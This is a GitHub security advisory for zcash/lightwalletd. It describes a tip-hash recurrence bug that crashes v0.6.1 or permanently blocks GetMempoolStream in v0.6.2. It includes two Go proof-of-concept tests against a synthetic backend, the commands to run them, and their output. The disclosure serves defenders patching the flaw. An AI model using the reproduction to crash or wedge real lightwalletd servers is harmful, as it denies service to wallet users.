# GHSA-fhv5-hm8v-q7fw: Tip hash returning to a previous value -> process exit (<= 0.6.1) or permanently blocked GetMempoolStream (0.6.2) in lightwalletd

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-fhv5-hm8v-q7fw |
| CVE | none assigned |
| Severity | medium |
| CWE | CWE-129, CWE-667 |
| Published | 2026-11-25T22:56:24Z |
| Updated | 2026-11-25T22:56:24Z |
| Affected | github.com/zcash/lightwalletd <= 0.6.2 (patched: 0.6.3) |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-fhv5-hm8v-q7fw |

## Description (verbatim)

### Summary

`GetMempool` keeps a per-stream index into the shared mempool list and resets that list whenever the backend's tip hash changes. If the tip hash goes H1 → H2 → H1 while a stream that started under H1 is still open, that stream slices the reset list with a stale index and panics. On v0.6.1 the panic ends the process. On v0.6.2 the new recovery interceptor catches it, but the panic happens while `g_lock` is held and nothing releases the lock afterwards, so every later `GetMempoolStream` call blocks until the process is restarted.

The trigger is a sequence of well-formed backend replies, not malformed data. We reproduced it with a synthetic backend in local tests on both versions. We have not reproduced it with real nodes and do not know how often a deployment sees a tip hash recur.


### Details

**The stale index.** In [v0.6.2 `GetMempool`](https://github.com/zcash/lightwalletd/blob/f8fe2cca7ede03b1f06b1d637a2ab467d151b79d/common/mempool.go#L43-L109), each stream records the tip hash at entry (`stayHash`) and an `index` into `g_txList`. [`refreshMempool`](https://github.com/zcash/lightwalletd/blob/f8fe2cca7ede03b1f06b1d637a2ab467d151b79d/common/mempool.go#L123-L135) replaces `g_txList` with an empty list whenever `getblockchaininfo` reports a different tip. A stream leaves the loop when it sees that the tip no longer equals its `stayHash`, but it only checks at loop boundaries. Sending to the client happens outside the lock, so a stream whose client is slow to read can sit in `sendToClient` for the whole time the tip is H2. If the tip is H1 again when that stream resumes, the check passes and [`g_txList[index:]`](https://github.com/zcash/lightwalletd/blob/f8fe2cca7ede03b1f06b1d637a2ab467d151b79d/common/mempool.go#L86-L95) runs with `index` greater than the length of the new list.

**v0.6.1.** The same logic is in [v0.6.1](https://github.com/zcash/lightwalletd/blob/0bf0a40854de6bd9a50400f94f0f94fbb53ac743/common/mempool.go#L38-L101); the slice is at line 79. There is no recovery interceptor in that release, so the panic terminates the process.

**v0.6.2.** The slice at line 93 is inside a critical section that takes `g_lock` at line 86 and releases it at line 95 without `defer`. The [recovery interceptor](https://github.com/zcash/lightwalletd/blob/f8fe2cca7ede03b1f06b1d637a2ab467d151b79d/cmd/root.go#L129-L150) turns the panic into `Internal` for that one stream, but the unlock at line 95 never runs. After that, new callers block at the [`g_lock.Lock()` on entry](https://github.com/zcash/lightwalletd/blob/f8fe2cca7ede03b1f06b1d637a2ab467d151b79d/common/mempool.go#L43-L47), and the [deferred reset in `refreshMempool`](https://github.com/zcash/lightwalletd/blob/f8fe2cca7ede03b1f06b1d637a2ab467d151b79d/common/mempool.go#L114-L121) needs the same lock. A goroutine waiting on a mutex does not observe context cancellation, so a handler blocked there does not return when its client gives up.

**Who supplies what.** The slow-reading stream can be any client's, including one opened for the purpose. The recurring tip hash has to come from the backend. We have not established which real backend conditions produce it. A local model in which each `getblockchaininfo` reply independently reports one of two tips (as two backends behind a load balancer might during block propagation) wedged in 8 of 20 and 6 of 20 trials with 30 concurrent stream clients, and in 0 of 20 with 3 or 10 clients, over two rounds. That model uses an accelerated clock and is not a measurement of any deployment; the test is available on request.



### Proof of concept

All tests are local and use a synthetic backend; no node is contacted. In a fresh clone, save each Go file at the path in its heading after the matching checkout, then run:

```sh
git clone https://github.com/zcash/lightwalletd.git lightwalletd-poc
cd lightwalletd-poc
git checkout 0bf0a40854de6bd9a50400f94f0f94fbb53ac743
for i in 1 2; do go test -trimpath ./common -run '^TestPoCV061MempoolIndexCrash$' -count=1 -v -timeout 30s; done
git checkout f8fe2cca7ede03b1f06b1d637a2ab467d151b79d
for i in 1 2; do go test -trimpath ./cmd -run '^TestPoCA1Wedge$' -count=1 -v -timeout 120s; done
```

### v0.6.1 — `common/zz_poc_v061_mempool_index_test.go`

<details><summary>zz_poc_v061_mempool_index_test.go</summary>

```go
package common

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/zcash/lightwalletd/walletrpc"
)

func TestPoCV061MempoolIndexCrash(t *testing.T) {
	if os.Getenv("POC_V061_CHILD") != "1" {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		child := exec.CommandContext(ctx, os.Args[0], "-test.run=^TestPoCV061MempoolIndexCrash$", "-test.v")
		child.Env = append(os.Environ(), "POC_V061_CHILD=1")
		out, err := child.CombinedOutput()
		var exit *exec.ExitError
		if !errors.As(err, &exit) || exit.ExitCode() != 2 ||
			!bytes.Contains(out, []byte("slice bounds out of range [1:0]")) ||
			!bytes.Contains(out, []byte("common/mempool.go:79")) {
			t.Fatalf("child err=%v timeout=%v\n%s", err, ctx.Err(), out)
		}
		for _, line := range strings.Split(string(out), "\n") {
			if strings.Contains(line, "panic: runtime error:") || strings.Contains(line, "common/mempool.go:79") {
				t.Log(line)
			}
		}
		t.Logf("v0.6.1 child exit=%d", exit.ExitCode())
		return
	}
	h1, h2 := strings.Repeat("1", 64), strings.Repeat("2", 64)
	var tip, list atomic.Value
	tip.Store(h1)
	list.Store([]string{})
	RawRequest = func(_ context.Context, method string, _ []json.RawMessage) (json.RawMessage, error) {
		switch method {
		case "getblockchaininfo":
			return json.Marshal(&ZcashdRpcReplyGetblockchaininfo{BestBlockHash: tip.Load().(string), Blocks: 100})
		case "getrawmempool":
			return json.Marshal(list.Load().([]string))
		case "getrawtransaction":
			return json.RawMessage(`{"hex":"aabb"}`), nil
		}
		return nil, fmt.Errorf("unexpected RPC: %s", method)
	}
	var tick atomic.Int64
	tick.Store(time.Now().UnixNano())
	Time.Now = func() time.Time { return time.Unix(0, tick.Load()) }
	Time.After = func(time.Duration) <-chan time.Time {
		c := make(chan time.Time, 1)
		c <- Time.Now()
		return c
	}
	noSend := func(*walletrpc.RawTransaction) error { return errors.New("unexpected send") }
	if err := GetMempool(context.Background(), noSend); err != nil {
		t.Fatal(err)
	}
	list.Store([]string{"t1"})
	tick.Add(int64(3 * time.Second))
	sent, release := make(chan struct{}), make(chan struct{})
	go func() {
		err := GetMempool(context.Background(), func(*walletrpc.RawTransaction) error {
			close(sent)
			<-release
			return nil
		})
		fmt.Fprintf(os.Stderr, "stream survived: %v\n", err)
	}()
	select {
	case <-sent:
	case <-time.After(2 * time.Second):
		t.Fatal("stream did not enter sendToClient")
	}
	tip.Store(h2)
	list.Store([]string{})
	tick.Add(int64(3 * time.Second))
	if err := GetMempool(context.Background(), noSend); err != nil {
		t.Fatal(err)
	}
	tip.Store(h1)
	tick.Add(int64(3 * time.Second))
	if err := GetMempool(context.Background(), noSend); err != nil {
		t.Fatal(err)
	}
	close(release)
	<-time.After(2 * time.Second)
	t.Fatal("child survived without the expected panic")
}
```

</details>

### v0.6.2 — `cmd/zz_poc_a1_wedge_test.go`

<details><summary>zz_poc_a1_wedge_test.go</summary>

```go
package cmd

import (
	"context"
	"encoding/json"
	"errors"
	"github.com/zcash/lightwalletd/common"
	"github.com/zcash/lightwalletd/frontend"
	"github.com/zcash/lightwalletd/walletrpc"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/status"
	"google.golang.org/grpc/test/bufconn"
	"io"
	"net"
	"runtime"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

func TestPoCA1Wedge(t *testing.T) {
	must := func(e error) {
		if e != nil {
			t.Fatal(e)
		}
	}
	oldOutput := logger.Out
	logger.SetOutput(io.Discard)
	defer logger.SetOutput(oldOutput)
	var tip, list atomic.Value
	h1, h2 := strings.Repeat("1", 64), strings.Repeat("2", 64)
	tip.Store(h1)
	list.Store([]string{})
	common.RawRequest = func(_ context.Context, method string, _ []json.RawMessage) (json.RawMessage, error) {
		switch method {
		case "getblockchaininfo":
			return json.Marshal(&common.ZcashdRpcReplyGetblockchaininfo{BestBlockHash: tip.Load().(string), Blocks: 100})
		case "getrawmempool":
			return json.Marshal(list.Load().([]string))
		case "getrawtransaction":
			return json.RawMessage(`{"hex":"aabb"}`), nil
		}
		return nil, errors.New("unexpected RPC: " + method)
	}
	service, err := frontend.NewLwdStreamer(nil, "test", false, 0, 0)
	must(err)
	lis := bufconn.Listen(1 << 20)
	server := grpc.NewServer(serverOptions(&common.Options{MaxConcurrentRecv: 32})...)
	walletrpc.RegisterCompactTxStreamerServer(server, service)
	go server.Serve(lis)
	defer server.Stop()
	conn, err := grpc.NewClient("passthrough:///bufnet",
		grpc.WithContextDialer(func(context.Context, string) (net.Conn, error) { return lis.Dial() }),
		grpc.WithTransportCredentials(insecure.NewCredentials()))
	must(err)
	defer conn.Close()
	client := walletrpc.NewCompactTxStreamerClient(conn)
	probe := func() {
		for i := 0; i < 100; i++ {
			ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
			s, e := client.GetMempoolStream(ctx, &walletrpc.Empty{})
			must(e)
			_, e = s.Recv()
			if e != io.EOF && status.Code(e) != codes.DeadlineExceeded {
				t.Fatalf("probe %d status=%v", i, e)
			}
			cancel()
		}
	}
	runtime.GC()
	control0 := runtime.NumGoroutine()
	probe()
	time.Sleep(2 * time.Second)
	runtime.GC()
	controlDelta := runtime.NumGoroutine() - control0
	var tick atomic.Int64
	tick.Store(time.Now().UnixNano())
	common.Time.Now = func() time.Time { return time.Unix(0, tick.Load()) }
	hold, paused := make(chan time.Time), make(chan struct{})
	var firstAfter atomic.Bool
	common.Time.After = func(time.Duration) <-chan time.Time {
		if firstAfter.CompareAndSwap(false, true) {
			close(paused)
			return hold
		}
		c := make(chan time.Time, 1)
		c <- common.Time.Now()
		return c
	}
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer cancel()
	once := func(label string) {
		s, e := client.GetMempoolStream(ctx, &walletrpc.Empty{})
		must(e)
		_, e = s.Recv()
		if e != io.EOF {
			t.Fatalf("%s: want EOF, got %v", label, e)
		}
	}
	list.Store([]string{"t1"})
	tick.Add(int64(3 * time.Second))
	a, err := client.GetMempoolStream(ctx, &walletrpc.Empty{})
	must(err)
	tx, err := a.Recv()
	if err != nil || len(tx.Data) != 2 {
		t.Fatalf("A first tx=%v err=%v", tx, err)
	}
	select {
	case <-paused:
	case <-time.After(time.Second):
		t.Fatal("A did not pause after sending")
	}
	tip.Store(h2)
	list.Store([]string{})
	tick.Add(int64(3 * time.Second))
	once("advance to H2")
	tip.Store(h1)
	tick.Add(int64(3 * time.Second))
	once("return to H1")
	close(hold)
	_, err = a.Recv()
	if status.Code(err) != codes.Internal {
		t.Fatalf("A status=%v", err)
	}
	_, aliveErr := client.GetLatestBlock(ctx, &walletrpc.ChainSpec{})
	must(aliveErr)
	runtime.GC()
	g0 := runtime.NumGoroutine()
	probe()
	time.Sleep(2 * time.Second)
	runtime.GC()
	g1 := runtime.NumGoroutine()
	t.Logf("wedged: g0=%d, g1=%d, delta=%d; control: delta=%d", g0, g1, g1-g0, controlDelta)
	if g1-g0 < 90 || controlDelta > 10 {
		t.Fatalf("unexpected goroutine deltas: wedged=%d control=%d", g1-g0, controlDelta)
	}
}
```

</details>

Remove both test files afterwards.

### Observed

v0.6.1 (`0bf0a40`), both runs:

```text
=== RUN   TestPoCV061MempoolIndexCrash
    zz_poc_v061_mempool_index_test.go:34: panic: runtime error: slice bounds out of range [1:0]
    zz_poc_v061_mempool_index_test.go:34: 	github.com/zcash/lightwalletd/common/mempool.go:79 +0x63c
    zz_poc_v061_mempool_index_test.go:37: v0.6.1 child exit=2
--- PASS: TestPoCV061MempoolIndexCrash (0.02s)
```

v0.6.2 (`f8fe2cc`), both runs:

```text
=== RUN   TestPoCA1Wedge
    zz_poc_a1_wedge_test.go:136: wedged: g0=11, g1=111, delta=100; control: delta=5
--- PASS: TestPoCA1Wedge (44.11s)
```

The v0.6.2 test discards the server log; without that, the recovery interceptor's "panic in gRPC handler" line with the stack through `common/mempool.go:93` is printed. In the v0.6.2 test the stream that hits the stale index receives `Internal`, a following `GetLatestBlock` succeeds, and 100 subsequent `GetMempoolStream` calls with a 200 ms client deadline all time out.


### Impact


On v0.6.1, one occurrence ends the process and disconnects every client of that instance.

On v0.6.2, the process stays up and other RPCs keep working, but `GetMempoolStream` is unavailable on that instance until restart. Each later call leaves one handler goroutine that never returns: 100 timed-out calls raised the goroutine count from 11 to 111 in both runs, against +5 for the same 100 calls before the wedge. Clients that retry therefore grow the goroutine count without bound for as long as the instance runs.

